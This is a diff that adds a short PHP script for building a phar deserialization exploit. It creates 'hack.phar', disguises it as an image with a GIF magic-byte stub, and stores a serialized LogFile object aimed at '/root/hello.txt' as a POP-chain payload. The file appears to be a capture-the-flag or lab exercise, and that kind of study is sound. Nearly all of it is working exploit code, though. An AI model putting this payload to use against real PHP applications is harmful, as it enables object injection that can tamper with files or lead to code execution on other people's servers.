@@ -1,0 +1,23 @@
+<?php
+//Create a POP Chain
+class LogFile
+{
+    public function __construct(){
+        $this->filename = '/root/hello.txt';
+        $this->fname = 'ethic Mohit';
+    }
+}
+
+$phar = new Phar("hack.phar");
+$phar->startBuffering();
+$phar->setStub("GIF8; <?php __halt_compiler(); ?>");
+
+//Begin the serialize
+$payload = new LogFile();
+$phar->setMetadata($payload);
+
+//Zip File Within the Phar Archive
+$phar->addFromString("test.txt","test");
+$phar->stopBuffering();
+
+?>
